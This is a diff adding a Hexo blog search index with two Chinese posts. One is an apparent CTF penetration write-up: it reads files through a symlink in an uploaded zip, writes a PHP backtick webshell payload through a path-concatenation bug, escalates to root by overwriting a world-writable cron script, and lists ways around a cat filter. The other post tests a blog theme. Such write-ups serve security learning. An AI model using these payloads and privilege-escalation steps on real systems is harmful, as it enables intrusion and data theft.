@@ -1,0 +1,67 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>从软链接解压到 Cron 提权：一次完整的 Web 渗透实战笔记</title>
+      <link href="/2026/04/12/314e6eb9/"/>
+      <url>/2026/04/12/314e6eb9/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本篇笔记记录了一次从文件上传入口开始，利用 Zip 自动解压特性读取源码，并最终通过 SUID 与 Cron 定时任务实现 Root 提权的实战过程。</p><hr><h2 id="0x01-第一阶段：软链接解压缩导致任意文件访问"><a href="#0x01-第一阶段：软链接解压缩导致任意文件访问" class="headerlink" title="0x01 第一阶段：软链接解压缩导致任意文件访问"></a>0x01 第一阶段：软链接解压缩导致任意文件访问</h2><p>本题初见是一个文件上传入口，环境会自动解压缩。我们可以构造软链接文件，利用解压特性读取系统敏感文件。</p><h3 id="Step-1：构造软链接"><a href="#Step-1：构造软链接" class="headerlink" title="Step 1：构造软链接"></a>Step 1：构造软链接</h3><p>在本地 Linux 环境下执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /flag.txt malicious</span><br></pre></td></tr></table></figure><ul><li><strong>malicious</strong>: 软链接文件，实际指向根目录下的 <code>/flag.txt</code>。</li></ul><h3 id="Step-2：打包-Zip（关键点）"><a href="#Step-2：打包-Zip（关键点）" class="headerlink" title="Step 2：打包 Zip（关键点）"></a>Step 2：打包 Zip（关键点）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip --symlinks payload.zip malicious</span><br></pre></td></tr></table></figure><ul><li>📌 <strong>关键参数</strong>：<code>--symlinks</code>。它会保留文件的软链接属性，而不是把链接指向的内容直接打包。</li></ul><p><strong>利用结果</strong>：上传后访问解压目录下的 <code>malicious</code>，即可直接读取到 flag 内容。</p><hr><h2 id="0x02-第二阶段：任意文件写入与-RCE-尝试"><a href="#0x02-第二阶段：任意文件写入与-RCE-尝试" class="headerlink" title="0x02 第二阶段：任意文件写入与 RCE 尝试"></a>0x02 第二阶段：任意文件写入与 RCE 尝试</h2><p>通过抓包修改 <code>file_content</code> 成功读取到 <code>admin.php</code> 源码。</p><h3 id="核心漏洞代码"><a href="#核心漏洞代码" class="headerlink" title="核心漏洞代码"></a>核心漏洞代码</h3><p>在该 PHP 脚本中，文件写入路径存在经典的拼接漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">&#123;$currentPath0&#125;</span>/../<span class="subst">&#123;$filename&#125;</span>&quot;</span>, <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><p>虽然源码对 <code>eval</code>、<code>system</code>、<code>cat</code> 等关键词做了正则替换，但漏掉了<strong>反引号 (&#96;&#96;)</strong> 和 <strong>tac</strong> 命令。我们可以直接通过文件写入功能生成一个恶意的 PHP 文件并访问。</p><p><strong>Payload 示例</strong>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=1.php&amp;content=&lt;?=`stat+/flag`?&gt;&amp;currentPath=./notes/user_xxx</span><br></pre></td></tr></table></figure><p>执行后发现 <code>/flag</code> 权限为 <code>0400</code>，Uid 为 <code>0 (root)</code>。确定需要提权。</p><hr><h2 id="0x03-第三阶段：从-SUID-到-Cron-提权"><a href="#0x03-第三阶段：从-SUID-到-Cron-提权" class="headerlink" title="0x03 第三阶段：从 SUID 到 Cron 提权"></a>0x03 第三阶段：从 SUID 到 Cron 提权</h2><h3 id="1-寻找-SUID-文件"><a href="#1-寻找-SUID-文件" class="headerlink" title="1. 寻找 SUID 文件"></a>1. 寻找 SUID 文件</h3><p>执行：<code>find / -perm -4000 2&gt;/dev/null</code><br>发现 <code>/usr/bin/crontab</code> 具有 SUID 权限。</p><h3 id="2-利用定时任务"><a href="#2-利用定时任务" class="headerlink" title="2. 利用定时任务"></a>2. 利用定时任务</h3><p>检查发现 <code>/etc/crontabs/root</code> 存在一个每分钟运行一次的脚本：<br><code>* * * * * /usr/local/src/tmp/cron_job07.sh</code></p><p>通过 <code>stat</code> 查看发现该脚本权限为 <strong>777</strong>（全写权限），任何用户可修改其内容。</p><h3 id="3-获取最终-Flag"><a href="#3-获取最终-Flag" class="headerlink" title="3. 获取最终 Flag"></a>3. 获取最终 Flag</h3><p>利用之前的任意文件写入漏洞，覆盖该脚本内容，让 root 在下一分钟帮我们执行提权指令：<br><code>content=tac /flag &gt; /var/www/html/notes/flag.txt</code></p><p>等待一分钟后，直接访问 Web 目录下的 <code>flag.txt</code> 即可。</p><hr><h2 id="0x04-总结：代替-cat-的常用方法"><a href="#0x04-总结：代替-cat-的常用方法" class="headerlink" title="0x04 总结：代替 cat 的常用方法"></a>0x04 总结：代替 cat 的常用方法</h2><p>当常用的 <code>cat</code> 被过滤时，可以尝试以下命令获取内容：</p><ul><li><strong>tac</strong>: 反向显示（从最后一行开始）</li><li><strong>nl</strong>: 读取并显示行号</li><li><strong>awk</strong>: <code>awk 1 /flag</code></li><li><strong>sed</strong>: <code>sed -n &#39;1,500p&#39; /flag</code></li><li><strong>head&#x2F;tail</strong>: 读取头部或尾部</li></ul><hr>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> 提权 </tag>
+            
+            <tag> PHP漏洞 </tag>
+            
+            <tag> 软链接 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hexo装修大功告成</title>
+      <link href="/2026/04/12/163f6d11/"/>
+      <url>/2026/04/12/163f6d11/</url>
+      
+        <content type="html"><![CDATA[<h2 id="🚀-Welcome-to-my-New-Horizon"><a href="#🚀-Welcome-to-my-New-Horizon" class="headerlink" title="🚀 Welcome to my New Horizon"></a>🚀 Welcome to my New Horizon</h2><p>经过一番“艰苦卓绝”的折腾，我的 Hexo 博客终于成功上线了！这次装修重点配置了 <strong>Butterfly</strong> 主题的一些高级特效，下面是功能测试环节：</p><h3 id="1-图标库测试-Font-Awesome"><a href="#1-图标库测试-Font-Awesome" class="headerlink" title="1. 图标库测试 (Font Awesome)"></a>1. 图标库测试 (Font Awesome)</h3><p>如果下面能看到小火箭和笔记图标，说明我们的图标库配置成功了：</p><ul><li>启航：<i class="fas fa-rocket" style="color: #31b0ef;"></i></li><li>记录：<i class="fas fa-edit" style="color: #f06a38;"></i></li></ul><h3 id="2-交互特效验证"><a href="#2-交互特效验证" class="headerlink" title="2. 交互特效验证"></a>2. 交互特效验证</h3><ul><li><strong>打字机效果</strong>：请看页面顶部的副标题，它应该正在自动循环播放文字。</li><li><strong>粒子背景</strong>：试着晃动你的鼠标，看看是否有蓝色的小线条在跟着你跑？ (这就是我们配的 <code>canvas_nest</code>)</li><li><strong>撒娇标签页</strong>：试着切换到别的浏览器窗口，再回头看看这个标签页的标题，是不是在求你回来？</li></ul><h3 id="3-图片资源测试"><a href="#3-图片资源测试" class="headerlink" title="3. 图片资源测试"></a>3. 图片资源测试</h3><p>这是第四步开启的 <code>post_asset_folder</code> 测试。</p><blockquote><p><strong>提示：</strong> 请把一张图片（比如 <code>test.jpg</code> ）丢进 <code>source/_posts/Hexo装修大功告成/</code> 文件夹里，然后取消下面这行的注释：<br><img src="/2026/04/12/163f6d11/test.jpg" alt="测试图片"></p></blockquote><p><strong>女仆寄语：</strong><br>在这里，我会记录关于 MATLAB、Python 开发以及各种技术探索的点点滴滴。</p><blockquote><p>保持好奇，继续探索。 ❤️</p></blockquote><blockquote><p>以上内容均由AI女仆生成，不过也能很大程度上反映了我的心路历程，所以就不改了~ （其实就是懒吧）</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> 博客建设 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Hexo </tag>
+            
+            <tag> Butterfly </tag>
+            
+            <tag> 博客 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
